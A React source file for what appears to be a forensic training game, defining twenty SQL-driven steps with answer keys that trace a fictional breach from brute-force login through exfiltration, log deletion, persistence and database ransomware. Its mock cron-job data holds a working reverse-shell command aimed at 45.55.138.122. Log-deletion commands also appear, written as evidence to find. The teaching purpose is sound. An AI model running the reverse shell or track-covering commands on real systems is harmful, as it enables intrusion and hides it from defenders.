
'use client';

import { useState } from 'react';
import { SidebarProvider, Sidebar, SidebarInset } from '@/components/ui/sidebar';
import { InvestigationNav } from '@/components/investigation-nav';
import { InvestigationView } from '@/components/investigation-view';
import { ReportView } from '@/components/report-view';
import { Card, CardHeader, CardTitle, CardDescription, CardContent } from '@/components/ui/card';
import { useToast } from '@/hooks/use-toast';

const investigationSteps = [
    // Step 1: Initial Anomaly
    {
        title: 'Step 1: The Initial Anomaly',
        description: 'At 23:15 UTC on Oct 25th, 2023, an automated alert flagged an unusually high number of failed login attempts from a single IP address. This is where our investigation begins. Your first task is to identify the source of this activity.',
        objectives: ['Analyze the access logs to find the IP address with the most failed logins.'],
        queryOptions: [
            { id: 'q1-1', query: "SELECT ip_address, status FROM access_logs WHERE timestamp > '2023-10-25 23:15:00';" },
            { id: 'q1-2', query: "SELECT user_id, COUNT(*) as failed_attempts FROM access_logs WHERE status = 'FAILED' GROUP BY user_id ORDER BY failed_attempts DESC;" },
            { id: 'q1-3', query: "SELECT ip_address, COUNT(*) as attempts FROM access_logs WHERE status = 'FAILED' GROUP BY ip_address ORDER BY attempts DESC;" },
        ],
        queryResults: {
            'q1-1': { columns: ['ip_address', 'status'], data: [{ ip_address: '203.0.113.55', status: 'FAILED' }, { ip_address: '198.51.100.12', status: 'SUCCESS' }, { ip_address: '203.0.113.55', status: 'FAILED' }] },
            'q1-2': { columns: ['user_id', 'failed_attempts'], data: [{ user_id: '45', failed_attempts: 99 }, { user_id: '112', failed_attempts: 1 }] },
            'q1-3': { columns: ['ip_address', 'attempts'], data: [{ ip_address: '203.0.113.55', attempts: 99 }, { ip_address: '198.51.100.101', attempts: 2 }, { ip_address: '203.0.113.12', attempts: 1 }] },
        },
        question: 'Which IP address is responsible for the high number of failed login attempts?',
        answerOptions: [
            { id: 'a', label: '198.51.100.101' },
            { id: 'b', label: '203.0.113.55' },
            { id: 'c', label: '203.0.113.12' },
        ],
        correctAnswerId: 'b',
        hint: 'Count the number of FAILED attempts for each IP address. The one with an abnormally high count is your suspect.'
    },
    // Step 2: Identifying the Target
    {
        title: 'Step 2: Identifying the Target',
        description: 'You\'ve flagged the suspicious IP: 203.0.113.55. Brute-force attacks usually target a specific user account. Your next objective is to determine which user was the target of the attack from this IP.',
        objectives: ['Find the user_id that was repeatedly targeted by the attacker\'s IP.'],
        queryOptions: [
            { id: 'q2-1', query: "SELECT user_id, COUNT(*) as attempts FROM access_logs WHERE ip_address = '203.0.113.55' AND status = 'FAILED' GROUP BY user_id ORDER BY attempts DESC;" },
            { id: 'q2-2', query: "SELECT user_id, ip_address FROM access_logs WHERE status = 'SUCCESS';" },
            { id: 'q2-3', query: "SELECT DISTINCT user_id FROM access_logs WHERE ip_address = '203.0.113.55';" },
        ],
        queryResults: {
            'q2-1': { columns: ['user_id', 'attempts'], data: [{ user_id: '45', attempts: 99 }] },
            'q2-2': { columns: ['user_id', 'ip_address'], data: [{ user_id: '12', ip_address: '192.168.1.5' }] },
            'q2-3': { columns: ['user_id'], data: [{ user_id: '45' }] },
        },
        question: 'Which user ID was the primary target of the attack from IP 203.0.113.55?',
        answerOptions: [
            { id: 'a', label: '12' },
            { id: 'b', label: '78' },
            { id: 'c', label: '45' },
        ],
        correctAnswerId: 'c',
        hint: 'Filter the logs for the attacker\'s IP and failed logins, then group by user to see who they focused on.'
    },
    // Step 3: The Successful Breach
    {
        title: 'Step 3: The Successful Breach',
        description: 'The attacker relentlessly targeted user_id 45 from IP 203.0.113.55. Now, we must confirm if they ever succeeded. Pinpoint the exact timestamp of the first successful login for this user from the attacker\'s IP.',
        objectives: ['Find the timestamp of the successful login for user_id 45 from IP 203.0.113.55.'],
        queryOptions: [
            { id: 'q3-1', query: "SELECT timestamp, status FROM access_logs WHERE user_id = '45' ORDER BY timestamp;" },
            { id: 'q3-2', query: "SELECT timestamp FROM access_logs WHERE user_id = '45' AND ip_address = '203.0.113.55' AND status = 'SUCCESS';" },
            { id: 'q3-3', query: "SELECT * FROM users WHERE user_id = '45';" },
        ],
        queryResults: {
            'q3-1': { columns: ['timestamp', 'status'], data: [{ timestamp: '2023-10-25 23:21:02', status: 'SUCCESS' }, { timestamp: '2023-10-25 23:20:19', status: 'FAILED' }] },
            'q3-2': { columns: ['timestamp'], data: [{ timestamp: '2023-10-25 23:21:02' }] },
            'q3-3': { columns: ['user_id', 'username', 'last_login'], data: [{ user_id: '45', username: 'e.vance', last_login: '2023-10-25 23:10:05' }] },
        },
        question: 'At what time did the attacker successfully log in?',
        answerOptions: [
            { id: 'a', label: '2023-10-25 23:20:19' },
            { id: 'b', label: '2023-10-25 23:10:05' },
            { id: 'c', label: '2023-10-25 23:21:02' },
        ],
        correctAnswerId: 'c',
        hint: 'You need to find the log entry that matches the user, the attacker\'s IP, and a SUCCESS status.'
    },
    // Step 4: First Post-Breach Action
    {
        title: 'Step 4: First Post-Breach Action',
        description: 'With access gained at 23:21:02, the attacker is inside. What was their first move? Examine the activity logs for user_id 45 immediately following the breach to understand their initial intent.',
        objectives: ['Identify the first action taken by user_id 45 after the successful login.'],
        queryOptions: [
            { id: 'q4-1', query: "SELECT action, details, timestamp FROM activity_logs WHERE user_id = '45' AND ip_address = '203.0.113.55' AND timestamp > '2023-10-25 23:21:02' ORDER BY timestamp ASC LIMIT 1;" },
            { id: 'q4-2', query: "SELECT * FROM activity_logs WHERE user_id = '45';" },
            { id: 'q4-3', query: "SELECT action FROM activity_logs WHERE ip_address = '203.0.113.55';" },
        ],
        queryResults: {
            'q4-1': { columns: ['action', 'details', 'timestamp'], data: [{ action: 'LIST_DIRECTORIES', details: 'Executed ls -la in /home/e.vance', timestamp: '2023-10-25 23:22:15' }] },
            'q4-2': { columns: ['action', 'details', 'timestamp'], data: [{ action: 'LOGIN', details: '', timestamp: '2023-10-25 23:10:05' }] },
            'q4-3': { columns: ['action'], data: [{ action: 'LIST_DATABASES' }, { action: 'VIEW_CUSTOMER_RECORDS' }] },
        },
        question: 'What was the first action performed by the attacker after gaining access?',
        answerOptions: [
            { id: 'a', label: 'VIEW_CUSTOMER_RECORDS' },
            { id: 'b', label: 'LIST_DIRECTORIES' },
            { id: 'c', label: 'CHANGE_PASSWORD' },
        ],
        correctAnswerId: 'b',
        hint: 'Filter the activity log for the compromised user and IP, ensuring you only look at actions taken *after* the breach time. Order by timestamp to find the first one.'
    },
    // Step 5: Privilege Escalation Attempt
    {
        title: 'Step 5: Privilege Escalation Attempt',
        description: 'Listing directories is a classic reconnaissance move. Attackers often check for system information and user privileges next. Look for any commands related to checking user identity or system details.',
        objectives: ['Find out if the attacker tried to check their current user privileges or system information.'],
        queryOptions: [
            { id: 'q5-1', query: "SELECT action, details FROM activity_logs WHERE user_id = '45' AND ip_address = '203.0.113.55' AND timestamp > '2023-10-25 23:22:15' ORDER BY timestamp ASC;" },
            { id: 'q5-2', query: "SELECT * FROM system_commands WHERE user_id = '45';" },
            { id: 'q5-3', query: "SELECT details FROM activity_logs WHERE action LIKE '%_PRIVILEGES';" },
        ],
        queryResults: {
            'q5-1': { columns: ['action', 'details'], data: [{ action: 'RUN_COMMAND', details: 'Executed command: whoami' }, { action: 'RUN_COMMAND', details: 'Executed command: uname -a' }] },
            'q5-2': { columns: [], data: [] },
            'q5-3': { columns: ['details'], data: [] },
        },
        question: 'Which command did the attacker run to check their user identity?',
        answerOptions: [
            { id: 'a', label: 'uname -a' },
            { id: 'b', label: 'ls -la' },
            { id: 'c', label: 'whoami' },
        ],
        correctAnswerId: 'c',
        hint: 'Commands like `whoami`, `id`, or `sudo -l` are common for checking privileges. Look for these in the `details` column of the activity logs.'
    },
    // Step 6: Database Reconnaissance
    {
        title: 'Step 6: Database Reconnaissance',
        description: 'After checking user privileges, the attacker has now turned their attention to the databases. This is a clear sign they are hunting for valuable data. Find the command they used to list available databases.',
        objectives: ['Identify the action where the attacker lists the databases.'],
        queryOptions: [
            { id: 'q6-1', query: "SELECT action, details, timestamp FROM activity_logs WHERE user_id = '45' AND ip_address = '203.0.113.55' AND timestamp > '2023-10-25 23:23:00' ORDER BY timestamp ASC;" },
            { id: 'q6-2', query: "SELECT * FROM database_logs WHERE user_id = '45';" },
            { id: 'q6-3', query: "SELECT action FROM activity_logs WHERE action = 'LIST_DATABASES';" }
        ],
        queryResults: {
            'q6-1': { columns: ['action', 'details', 'timestamp'], data: [{ action: 'LIST_DATABASES', details: 'Executed command to show available databases', timestamp: '2023-10-25 23:24:10' }, { action: 'VIEW_CUSTOMER_RECORDS', details: 'Accessed table: customers', timestamp: '2023-10-25 23:25:01' }] },
            'q6-2': { columns: [], data: [] },
            'q6-3': { columns: ['action'], data: [{ action: 'LIST_DATABASES' }] }
        },
        question: 'Which action indicates the attacker was exploring the databases?',
        answerOptions: [
            { id: 'a', label: 'VIEW_CUSTOMER_RECORDS' },
            { id: 'b', label: 'LIST_DATABASES' },
            { id: 'c', label: 'RUN_COMMAND' },
        ],
        correctAnswerId: 'b',
        hint: 'Look for a specific action name in the logs that explicitly states the attacker is listing databases.'
    },
    // Step 7: Targeting Sensitive Data
    {
        title: 'Step 7: Targeting Sensitive Data',
        description: 'The attacker listed the databases and immediately moved to access a specific table. This is a critical moment in the breach. You must identify which table they targeted.',
        objectives: ['Find out which table the attacker accessed after listing databases.'],
        queryOptions: [
            { id: 'q7-1', query: "SELECT action, details, timestamp FROM activity_logs WHERE user_id = '45' AND ip_address = '203.0.113.55' AND timestamp > '2023-10-25 23:24:10' ORDER BY timestamp ASC;" },
            { id: 'q7-2', query: "SELECT * FROM files WHERE owner_id = '45';" },
            { id: 'q7-3', query: "SELECT details FROM activity_logs WHERE action LIKE 'VIEW_%_RECORDS';" },
        ],
        queryResults: {
            'q7-1': { columns: ['action', 'details', 'timestamp'], data: [{ action: 'VIEW_CUSTOMER_RECORDS', details: 'Accessed table: customers', timestamp: '2023-10-25 23:25:01' }, { action: 'EXPORT_DATA', details: 'Exported 500 rows from customers', timestamp: '2023-10-25 23:26:30' }] },
            'q7-2': { columns: [], data: [] },
            'q7-3': { columns: ['details'], data: [{ details: 'Accessed table: customers' }] },
        },
        question: 'Which data table did the attacker access after their initial reconnaissance?',
        answerOptions: [
            { id: 'a', label: 'employees' },
            { id: 'b', label: 'financial_reports' },
            { id: 'c', label: 'customers' },
        ],
        correctAnswerId: 'c',
        hint: 'Look at the sequence of actions immediately following the "LIST_DATABASES" action. The `details` of the next action should reveal the table name.'
    },
    // Step 8: Data Staging
    {
        title: 'Step 8: Data Staging',
        description: 'Before exfiltrating data, attackers often package it into a single file. This is called "staging". Look for any file creation or modification activities, especially creating archives like .zip or .tar files.',
        objectives: ['Identify if the attacker created an archive file to stage the data.'],
        queryOptions: [
            { id: 'q8-1', query: "SELECT action, details FROM activity_logs WHERE user_id = '45' AND (action LIKE '%CREATE%' OR action LIKE '%COMPRESS%') AND timestamp > '2023-10-25 23:25:01';" },
            { id: 'q8-2', query: "SELECT * FROM file_system_logs WHERE user_id = '45' AND operation = 'CREATE_FILE';" },
            { id: 'q8-3', query: "SELECT details FROM activity_logs WHERE details LIKE '%.zip' OR details LIKE '%.tar.gz';" }
        ],
        queryResults: {
            'q8-1': { columns: ['action', 'details'], data: [{ action: 'RUN_COMMAND', details: 'Executed command: zip /tmp/cust_data.zip a.csv' }] },
            'q8-2': { columns: ['timestamp', 'user_id', 'operation', 'file_path'], data: [{ timestamp: '2023-10-25 23:28:15', user_id: '45', operation: 'CREATE_FILE', file_path: '/tmp/cust_data.zip' }] },
            'q8-3': { columns: ['details'], data: [{ details: 'Executed command: zip /tmp/cust_data.zip a.csv' }] },
        },
        question: 'What was the name of the staged archive file created by the attacker?',
        answerOptions: [
            { id: 'a', label: 'backup.zip' },
            { id: 'b', label: 'cust_data.zip' },
            { id: 'c', label: 'temp_archive.tar.gz' },
        ],
        correctAnswerId: 'b',
        hint: 'Look for commands like `zip`, `tar`, or `gzip` in the `activity_logs`. The filename will likely be in the `details`.'
    },
    // Step 9: The Exfiltration
    {
        title: 'Step 9: The Exfiltration',
        description: 'The data has been staged in `/tmp/cust_data.zip`. The final step before covering tracks is to send the data out of the network. This is data exfiltration. Find the log entry that confirms this.',
        objectives: ['Identify the action that corresponds to the staged data being stolen or exported.'],
        queryOptions: [
            { id: 'q9-1', query: "SELECT * FROM activity_logs WHERE user_id = '45' AND action LIKE '%EXPORT%' OR action LIKE '%TRANSFER%';" },
            { id: 'q9-2', query: "SELECT * FROM data_transfers WHERE source_ip = '203.0.113.55' AND file_name = 'cust_data.zip';" },
            { id: 'q9-3', query: "SELECT * FROM firewall_logs WHERE src_ip = '10.1.1.45' AND dest_ip != '10.0.0.0/8';" }
        ],
        queryResults: {
            'q9-1': { columns: ['timestamp', 'user_id', 'ip_address', 'action', 'details'], data: [{ timestamp: '2023-10-25 23:30:05', user_id: '45', ip_address: '203.0.113.55', action: 'DATA_TRANSFER_OUT', details: 'Transferred /tmp/cust_data.zip to 45.55.138.122' }] },
            'q9-2': { columns: ['timestamp', 'source_ip', 'destination_ip', 'file_name', 'bytes_transferred'], data: [{ timestamp: '2023-10-25 23:30:05', source_ip: '203.0.113.55', destination_ip: '45.55.138.122', file_name: 'cust_data.zip', bytes_transferred: '512000' }] },
            'q9-3': { columns: [], data: [] }
        },
        question: 'To which IP address was the data exfiltrated?',
        answerOptions: [
            { id: 'a', label: '203.0.113.55' },
            { id: 'b', label: '8.8.8.8' },
            { id: 'c', label: '45.55.138.122' },
        ],
        correctAnswerId: 'c',
        hint: 'Search for keywords related to `TRANSFER`, `EXPORT`, or `UPLOAD`. The destination IP will be the attacker\'s server.'
    },
    // Step 10: Covering Tracks - Deletion
    {
        title: 'Step 10: Covering Tracks - Deletion',
        description: 'After stealing the data, attackers often try to cover their tracks by deleting logs or files. Check if any deletion activities were performed by the attacker, including removing the staged file.',
        objectives: ['Find any deletion actions performed by the attacker.'],
        queryOptions: [
            { id: 'q10-1', query: "SELECT action, details, timestamp FROM activity_logs WHERE user_id = '45' AND ip_address = '203.0.113.55' AND action LIKE '%DELETE%';" },
            { id: 'q10-2', query: "SELECT * FROM activity_logs WHERE user_id = '45' AND details LIKE '%rm %' ORDER BY timestamp DESC;" },
            { id: 'q10-3', query: "SELECT timestamp, action, details FROM activity_logs WHERE user_id = '45' AND ip_address = '203.0.113.55' AND timestamp > '2023-10-25 23:30:05' ORDER BY timestamp ASC;" }
        ],
        queryResults: {
            'q10-1': { columns: ['action', 'details', 'timestamp'], data: [{ action: 'DELETE_FILE', details: 'Deleted file /tmp/cust_data.zip', timestamp: '2023-10-25 23:31:10' }] },
            'q10-2': { columns: ['timestamp', 'user_id', 'action', 'details'], data: [{ timestamp: '2023-10-25 23:31:10', user_id: '45', action: 'RUN_COMMAND', details: 'Executed command: rm /tmp/cust_data.zip' }] },
            'q10-3': { columns: ['timestamp', 'action', 'details'], data: [{ timestamp: '2023-10-25 23:31:10', action: 'DELETE_FILE', details: 'Deleted file /tmp/cust_data.zip' }] }
        },
        question: 'What file did the attacker delete to cover their tracks?',
        answerOptions: [
            { id: 'a', label: '/var/log/auth.log' },
            { id: 'b', label: '/home/e.vance/.bash_history' },
            { id: 'c', label: '/tmp/cust_data.zip' },
        ],
        correctAnswerId: 'c',
        hint: 'Look for actions containing terms like "DELETE" or "REMOVE", especially for the staged file you identified earlier.'
    },
    // Step 11: Covering Tracks - Log Manipulation
    {
        title: 'Step 11: Covering Tracks - Log Manipulation',
        description: 'Deleting files is one thing, but a savvy attacker will also try to erase their presence from the logs. Check for any log manipulation or deletion activities.',
        objectives: ['Find evidence of the attacker deleting or modifying log files.'],
        queryOptions: [
            { id: 'q11-1', query: "SELECT action, details, timestamp FROM activity_logs WHERE user_id = '45' AND ip_address = '203.0.113.55' AND details LIKE '%/var/log%'; "},
            { id: 'q11-2', query: "SELECT * FROM file_system_logs WHERE operation = 'DELETE_FILE' AND file_path LIKE '%.log';" },
            { id: 'q11-3', query: "SELECT * FROM audit_logs WHERE action = 'CLEAR_LOGS';" }
        ],
        queryResults: {
            'q11-1': { columns: ['action', 'details', 'timestamp'], data: [{ action: 'DELETE_LOG_FILE', details: 'Deleted /var/log/app_audit.log', timestamp: '2023-10-25 23:32:45' }] },
            'q11-2': { columns: ['timestamp', 'user_id', 'operation', 'file_path'], data: [{ timestamp: '2023-10-25 23:32:45', user_id: '45', operation: 'DELETE_FILE', file_path: '/var/log/app_audit.log' }] },
            'q11-3': { columns: [], data: [] }
        },
        question: 'Which application log file did the attacker delete?',
        answerOptions: [
            { id: 'a', label: 'system.log' },
            { id: 'b', label: 'auth.log' },
            { id: 'c', label: 'app_audit.log' },
        ],
        correctAnswerId: 'c',
        hint: 'Look for deletion events targeting files in `/var/log/`. The filename is key.'
    },
    // Step 12: Establishing Persistence - New User
    {
        title: 'Step 12: Establishing Persistence - New User',
        description: 'Attackers often create a new user account to maintain access. A new admin account is a major red flag. Check the `users` table for any accounts created around the time of the attack.',
        objectives: ['Look for any suspicious user accounts created on October 25th or 26th.'],
        queryOptions: [
            { id: 'q12-1', query: "SELECT user_id, username, role, created_at FROM users WHERE created_at > '2023-10-25 00:00:00';" },
            { id: 'q12-2', query: "SELECT * FROM users WHERE role = 'ADMIN';" },
            { id: 'q12-3', query: "SELECT * FROM audit_logs WHERE action = 'CREATE_USER';" }
        ],
        queryResults: {
            'q12-1': { columns: ['user_id', 'username', 'role', 'created_at'], data: [{ user_id: '256', username: 'backup_admin', role: 'ADMIN', created_at: '2023-10-25 23:55:10' }] },
            'q12-2': { columns: ['user_id', 'username', 'role'], data: [{ user_id: '1', username: 'admin', role: 'ADMIN' }, { user_id: '256', username: 'backup_admin', role: 'ADMIN' }] },
            'q12-3': { columns: ['timestamp', 'user_id', 'action', 'details'], data: [{ timestamp: '2023-10-25 23:55:10', user_id: '45', action: 'CREATE_USER', details: 'Created user_id 256' }] }
        },
        question: 'What is the username of the suspicious account created during the incident window?',
        answerOptions: [
            { id: 'a', label: 'admin' },
            { id: 'b', label: 'e.vance' },
            { id: 'c', label: 'backup_admin' },
        ],
        correctAnswerId: 'c',
        hint: 'Query the users table for accounts with a `created_at` timestamp close to the time of the attack.'
    },
    // Step 13: Establishing Persistence - Scheduled Task
    {
        title: 'Step 13: Establishing Persistence - Scheduled Task',
        description: 'Another common persistence method is creating a scheduled task or cron job that connects back to the attacker. Check the system\'s scheduled tasks for anything unusual.',
        objectives: ['Investigate the `cron_jobs` table for suspicious entries created by the attacker.'],
        queryOptions: [
            { id: 'q13-1', query: "SELECT * FROM cron_jobs WHERE created_by = '45' OR command LIKE '%45.55.138.122%';" },
            { id: 'q13-2', query: "SELECT * FROM cron_jobs WHERE created_at > '2023-10-25 23:00:00';" },
            { id: 'q13-3', query: "SELECT * FROM system_commands WHERE command LIKE '%cron%';" }
        ],
        queryResults: {
            'q13-1': { columns: ['job_id', 'schedule', 'command', 'created_by'], data: [{ job_id: 'cron-8812', schedule: '*/10 * * * *', command: 'bash -c "bash -i >& /dev/tcp/45.55.138.122/4444 0>&1"', created_by: '45' }] },
            'q13-2': { columns: ['job_id', 'schedule', 'command', 'created_by'], data: [{ job_id: 'cron-8812', schedule: '*/10 * * * *', command: 'bash -c "bash -i >& /dev/tcp/45.55.138.122/4444 0>&1"', created_by: '45' }] },
            'q13-3': { columns: [], data: [] }
        },
        question: 'What does the suspicious cron job command do?',
        answerOptions: [
            { id: 'a', label: 'Deletes old log files every 10 minutes.' },
            { id: 'b', label: 'Opens a reverse shell to the attacker\'s IP.' },
            { id: 'c', 'label': 'Checks for system updates every hour.' }
        ],
        correctAnswerId: 'b',
        hint: 'The command `/dev/tcp/IP/PORT` is a classic signature for a reverse shell, which gives an attacker remote access.'
    },
    // Step 14: Lateral Movement Attempt
    {
        title: 'Step 14: Lateral Movement Attempt',
        description: 'The attacker has a foothold. Now they may try to move to other systems on the network (lateral movement). Check firewall or network logs for connection attempts from the compromised server to other internal servers.',
        objectives: ['Find evidence of the compromised server trying to connect to other internal IPs.'],
        queryOptions: [
            { id: 'q14-1', query: "SELECT * FROM firewall_logs WHERE src_ip = '10.1.1.45' AND dest_ip LIKE '10.1.1.%';" },
            { id: 'q14-2', query: "SELECT * FROM network_traffic WHERE source_hostname = 'WEB-PROD-01' AND destination_ip LIKE '10.%';" },
            { id: 'q14-3', query: "SELECT * FROM activity_logs WHERE details LIKE '%ssh %' OR details LIKE '%scp %';" }
        ],
        queryResults: {
            'q14-1': { columns: ['timestamp', 'src_ip', 'dest_ip', 'dest_port', 'action'], data: [{ timestamp: '2023-10-25 23:45:12', src_ip: '10.1.1.45', dest_ip: '10.1.1.50', dest_port: '22', action: 'ALLOW' }] },
            'q14-2': { columns: ['timestamp', 'source_hostname', 'destination_ip', 'port'], data: [{ timestamp: '2023-10-25 23:45:12', source_hostname: 'WEB-PROD-01', destination_ip: '10.1.1.50', port: '22' }] },
            'q14-3': { columns: ['timestamp', 'action', 'details'], data: [{ timestamp: '2023-10-25 23:45:10', action: 'RUN_COMMAND', details: 'Executed command: ssh admin@10.1.1.50' }] }
        },
        question: 'Which internal IP address did the attacker attempt to connect to?',
        answerOptions: [
            { id: 'a', label: '10.1.1.1' },
            { id: 'b', label: '10.1.1.50' },
            { id: 'c', label: '192.168.1.1' },
        ],
        correctAnswerId: 'b',
        hint: 'The source IP of the compromised machine is `10.1.1.45`. Look for logs showing it as the source and another internal IP as the destination.'
    },
    // Step 15: The Second Target
    {
        title: 'Step 15: The Second Target',
        description: 'The attacker successfully connected to 10.1.1.50. This is likely a more valuable target. We need to know the hostname of this second machine to understand its role.',
        objectives: ['Identify the hostname of the server at IP 10.1.1.50.'],
        queryOptions: [
            { id: 'q15-1', query: "SELECT hostname FROM asset_inventory WHERE ip_address = '10.1.1.50';" },
            { id: 'q15-2', query: "SELECT * FROM dns_logs WHERE ip_address = '10.1.1.50';" },
            { id: 'q15-3', query: "SELECT details FROM activity_logs WHERE details LIKE '%10.1.1.50%';" }
        ],
        queryResults: {
            'q15-1': { columns: ['hostname'], data: [{ hostname: 'DB-MASTER-01' }] },
            'q15-2': { columns: ['timestamp', 'hostname', 'ip_address'], data: [{ timestamp: '2023-10-25 12:00:00', hostname: 'DB-MASTER-01', ip_address: '10.1.1.50' }] },
            'q15-3': { columns: [], data: [] }
        },
        question: 'What is the hostname of the second compromised server (10.1.1.50)?',
        answerOptions: [
            { id: 'a', label: 'WEB-PROD-02' },
            { id: 'b', label: 'APP-SERVICE-BUS' },
            { id: 'c', label: 'DB-MASTER-01' },
        ],
        correctAnswerId: 'c',
        hint: 'An `asset_inventory` or DNS log is the best place to map an IP address to a hostname.'
    },
    // Step 16: Pivoting to the Database Server
    {
        title: 'Step 16: Pivoting to the Database Server',
        description: 'The attacker has moved from a web server to the master database server. This is a major escalation. Let\'s check the database logs on DB-MASTER-01 for the attacker\'s activity. What was their first action?',
        objectives: ['Find the first action the attacker took on the database server.'],
        queryOptions: [
            { id: 'q16-1', query: "SELECT action, details FROM database_logs WHERE source_ip = '10.1.1.45' ORDER BY timestamp ASC LIMIT 1;" },
            { id: 'q16-2', query: "SELECT * FROM activity_logs WHERE hostname = 'DB-MASTER-01';" },
            { id: 'q16-3', query: "SELECT * FROM audit_logs WHERE details LIKE '%DB-MASTER-01%';" }
        ],
        queryResults: {
            'q16-1': { columns: ['action', 'details'], data: [{ action: 'CREATE_DATABASE_SNAPSHOT', details: 'Snapshot created: pre_attack_backup' }] },
            'q16-2': { columns: [], data: [] },
            'q16-3': { columns: [], data: [] }
        },
        question: 'What was the attacker\'s first action on the master database server?',
        answerOptions: [
            { id: 'a', label: 'DROP DATABASE users' },
            { id: 'b', label: 'CREATE_DATABASE_SNAPSHOT' },
            { id: 'c', label: 'SELECT * FROM financial_records' },
        ],
        correctAnswerId: 'b',
        hint: 'Look in the specific `database_logs` table, filtering by the source IP of the first compromised server (`10.1.1.45`).'
    },
    // Step 17: Malicious Payload
    {
        title: 'Step 17: Malicious Payload',
        description: 'Creating a snapshot is odd. Perhaps it\'s a distraction or preparation. After the snapshot, the attacker likely executed a more malicious command. Look for suspicious database commands.',
        objectives: ['Identify any destructive or unusual commands executed on the database server after the snapshot.'],
        queryOptions: [
            { id: 'q17-1', query: "SELECT action, details FROM database_logs WHERE source_ip = '10.1.1.45' AND timestamp > '2023-10-25 23:48:00' ORDER BY timestamp ASC;" },
            { id: 'q17-2', query: "SELECT * FROM database_logs WHERE command LIKE '%RANSOM%';" },
            { id: 'q17-3', query: "SELECT * FROM system_commands WHERE hostname = 'DB-MASTER-01';" }
        ],
        queryResults: {
            'q17-1': { columns: ['action', 'details'], data: [{ action: 'RUN_SQL', details: 'UPDATE all_tables SET data = ENCRYPT(data, \'badkey\');' }, { action: 'DROP_TABLE', details: 'DROP TABLE original_data_backup;' }] },
            'q17-2': { columns: [], data: [] },
            'q17-3': { columns: [], data: [] }
        },
        question: 'What malicious action did the attacker perform on the database?',
        answerOptions: [
            { id: 'a', 'label': 'Stole credit card information' },
            { id: 'b', 'label': 'Encrypted the data in all tables' },
            { id: 'c', 'label': 'Deleted all user accounts' },
        ],
        correctAnswerId: 'b',
        hint: 'ENCRYPT is the key term here. This looks like a ransomware attack.'
    },
    // Step 18: The Ransom Note
    {
        title: 'Step 18: The Ransom Note',
        description: 'Encrypting the database is a ransomware attack. Attackers usually leave a "ransom note" with instructions. They often create a file in a prominent location. Check for newly created text files.',
        objectives: ['Find the ransom note file created by the attacker.'],
        queryOptions: [
            { id: 'q18-1', query: "SELECT * FROM file_system_logs WHERE hostname = 'DB-MASTER-01' AND operation = 'CREATE_FILE' AND file_path LIKE '%.txt';" },
            { id: 'q18-2', query: "SELECT * FROM activity_logs WHERE details LIKE '%README%' OR details LIKE '%RANSOM%';" },
            { id: 'q18-3', query: "SELECT * FROM files WHERE content LIKE '%bitcoin%';" }
        ],
        queryResults: {
            'q18-1': { columns: ['timestamp', 'hostname', 'operation', 'file_path'], data: [{ timestamp: '2023-10-25 23:55:00', hostname: 'DB-MASTER-01', operation: 'CREATE_FILE', file_path: '/root/README_FOR_DECRYPT.txt' }] },
            'q18-2': { columns: ['timestamp', 'action', 'details'], data: [{ timestamp: '2023-10-25 23:55:00', action: 'CREATE_FILE', details: 'Created file: /root/README_FOR_DECRYPT.txt' }] },
            'q18-3': { columns: [], data: [] }
        },
        question: 'What is the name of the ransom note file?',
        answerOptions: [
            { id: 'a', label: 'instructions.txt' },
            { id: 'b', label: 'README_FOR_DECRYPT.txt' },
            { id: 'c', label: 'decrypt_me.txt' },
        ],
        correctAnswerId: 'b',
        hint: 'Look for file creation events on the database server around the time of the attack. The filename will likely be obvious.'
    },
    // Step 19: The Exit
    {
        title: 'Step 19: The Exit',
        description: 'The attacker has deployed their ransomware and left instructions. The final action in their session would be to log out. Confirm the exact time the attacker\'s session ended on the first server.',
        objectives: ['Find the timestamp for the final LOGOUT action of the session from the web server.'],
        queryOptions: [
            { id: 'q19-1', query: "SELECT timestamp FROM activity_logs WHERE user_id = '45' AND ip_address = '203.0.113.55' AND action = 'LOGOUT';" },
            { id: 'q19-2', query: "SELECT * FROM sessions WHERE user_id = '45' AND ip_address = '203.0.113.55';" },
            { id: 'q19-3', query: "SELECT MAX(timestamp) FROM activity_logs WHERE user_id = '45' AND ip_address = '203.0.113.55';" }
        ],
        queryResults: {
            'q19-1': { columns: ['timestamp'], data: [{ timestamp: '2023-10-26 00:15:00' }] },
            'q19-2': { columns: ['session_id', 'user_id', 'ip_address', 'start_time', 'end_time'], data: [{ session_id: 'xyz789', user_id: '45', ip_address: '203.0.113.55', start_time: '2023-10-25 23:21:02', end_time: '2023-10-26 00:15:00' }] },
            'q19-3': { columns: ['max'], data: [{ max: '2023-10-26 00:15:00' }] }
        },
        question: 'When did the attacker\'s session on the first server officially end?',
        answerOptions: [
            { id: 'a', label: '2023-10-25 23:55:00' },
            { id: 'b', label: '2023-10-26 00:15:00' },
            { id: 'c', label: '2023-10-26 00:00:00' },
        ],
        correctAnswerId: 'b',
        hint: 'Find the "LOGOUT" action in the activity log for the specific user and IP address.'
    },
    // Step 20: Final Damage Assessment
    {
        title: 'Step 20: Final Damage Assessment',
        description: 'You have traced the complex attack from start to finish. The final step is to summarize the primary damage. What was the ultimate goal and impact of this attack?',
        objectives: ['Summarize the primary goal and impact of the attack based on all evidence.'],
        queryOptions: [
            { id: 'q20-1', query: "SELECT * FROM incident_summary WHERE case_id = '001';" },
            { id: 'q20-2', query: "SELECT details FROM database_logs WHERE action = 'RUN_SQL' AND hostname = 'DB-MASTER-01';" },
            { id: 'q20-3', query: "SELECT * FROM data_transfers WHERE source_ip = '203.0.113.55';" }
        ],
        queryResults: {
            'q20-1': { columns: ['summary'], data: [{ summary: 'Attacker breached web server, moved to DB server, and deployed ransomware to encrypt data.' }] },
            'q20-2': { columns: ['details'], data: [{ details: 'UPDATE all_tables SET data = ENCRYPT(data, \'badkey\');' }] },
            'q20-3': { columns: ['timestamp', 'source_ip', 'destination_ip', 'file_name'], data: [{ timestamp: '2023-10-25 23:30:05', source_ip: '203.0.113.55', destination_ip: '45.55.138.122', file_name: 'cust_data.zip' }] },
        },
        question: 'What was the primary impact of this multi-stage attack?',
        answerOptions: [
            { id: 'a', label: 'Theft of 500 customer records for identity fraud.' },
            { id: 'b', label: 'Ransomware deployment encrypting the master database.' },
            { id: 'c', 'label': 'Creation of a backdoor admin account for long-term access.' },
        ],
        correctAnswerId: 'b',
        hint: 'While data was stolen and persistence was created, the final, most impactful action was on the database server. This defines the incident.'
    }
];


export function Dashboard() {
  const { toast } = useToast();
  const [activeView, setActiveView] = useState('briefing');
  const [investigationStep, setInvestigationStep] = useState(0);
  const [results, setResults] = useState<{data: any[], columns: string[]}>({data: [], columns: []});
